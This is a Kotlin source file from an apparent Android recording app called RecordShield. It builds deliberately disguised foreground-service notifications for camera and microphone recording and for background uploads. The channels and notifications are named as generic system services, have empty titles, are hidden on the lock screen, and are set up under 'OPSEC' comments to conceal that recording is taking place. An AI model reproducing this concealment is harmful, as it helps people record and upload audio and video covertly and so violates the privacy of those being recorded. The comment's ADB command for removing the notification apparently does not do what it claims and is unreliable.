package com.elysium.vanguard.recordshield.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.elysium.vanguard.recordshield.R
import com.elysium.vanguard.recordshield.RecordShieldApplication

/**
 * ============================================================================
 * StealthNotificationManager — Invisible Foreground Service Notifications
 * ============================================================================
 *
 * WHY STEALTH:
 *   Android REQUIRES a foreground service notification for camera+mic access.
 *   However, we can minimize its visibility:
 *
 *   1. IMPORTANCE_MIN: No sound, no vibration, no heads-up popup
 *   2. Empty/minimal content: Looks like a system process
 *   3. No custom icon: Uses default Android icon
 *   4. Positioned at bottom: Below all other notifications
 *   5. Cannot be swiped (setOngoing): Prevents user from accidentally dismissing
 *
 * Android 14+ Behavior:
 *   - The notification is MANDATORY for foreground service types
 *   - It will always be visible in the notification tray
 *   - But with IMPORTANCE_MIN, it's the LEAST visible possible
 *   - No sound, no vibration, no popup, no lock screen visibility
 *
 * OPSEC Considerations:
 *   - Notification text is generic ("System service")
 *   - No recording-specific information in the notification
 *   - No custom branding that reveals the app's purpose
 *   - If user wants ZERO notification, they must disable it via ADB:
 *     adb shell appops set com.elysium.vanguard.recordshield SYSTEM_ALERT_WINDOW allow
 * ============================================================================
 */
object StealthNotificationManager {

    private const val TAG = "StealthNotification"

    /**
     * Create the ultra-low-importance notification channel.
     * Must be called in Application.onCreate().
     */
    fun createStealthChannel(context: Context) {
        val manager = context.getSystemService(NotificationManager::class.java)

        // Channel 1: Stealth recording — MIN importance
        val stealthChannel = NotificationChannel(
            RecordShieldApplication.RECORDING_CHANNEL_ID,
            "Background Service", // Generic name, not "Recording"
            NotificationManager.IMPORTANCE_MIN // Least visible
        ).apply {
            description = "System background operation" // Generic description
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            setSound(null, null)
            lockscreenVisibility = Notification.VISIBILITY_SECRET // Hidden on lock screen
        }

        // Channel 2: Upload — MIN importance
        val uploadChannel = NotificationChannel(
            RecordShieldApplication.UPLOAD_CHANNEL_ID,
            "Data Sync",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Background data synchronization"
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            setSound(null, null)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }

        manager.createNotificationChannel(stealthChannel)
        manager.createNotificationChannel(uploadChannel)
    }

    /**
     * Build a stealth foreground service notification.
     *
     * This notification is REQUIRED by Android for camera+mic foreground services.
     * It's designed to be as invisible as possible while still satisfying the OS.
     */
    fun buildStealthNotification(
        context: Context,
        text: String = "Active"
    ): Notification {
        return NotificationCompat.Builder(context, RecordShieldApplication.RECORDING_CHANNEL_ID)
            .setContentTitle("") // Empty title — Android allows this for foreground services
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_info_details) // Generic system icon
            .setPriority(NotificationCompat.PRIORITY_MIN) // Least priority
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true) // Cannot be swiped away
            .setSilent(true) // No sound
            .setLocalOnly(true) // Don't show on other devices
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            // No heads-up, no vibrate, no lights
            .build()
    }

    /**
     * Build a minimal notification for the upload worker.
     */
    fun buildUploadNotification(
        context: Context,
        text: String = "Syncing data"
    ): Notification {
        return NotificationCompat.Builder(context, RecordShieldApplication.UPLOAD_CHANNEL_ID)
            .setContentTitle("")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .setLocalOnly(true)
            .build()
    }

    /**
     * Update the stealth notification text without making it visible.
     * Called from RecordingService to update chunk count.
     */
    fun updateStealthNotification(
        context: Context,
        notificationId: Int,
        text: String
    ) {
        val manager = context.getSystemService(NotificationManager::class.java)
        val notification = buildStealthNotification(context, text)
        manager.notify(notificationId, notification)
    }

    /**
     * Cancel a specific notification.
     */
    fun cancelNotification(context: Context, notificationId: Int) {
        val manager = context.getSystemService(NotificationManager::class.java)
        manager.cancel(notificationId)
    }
}
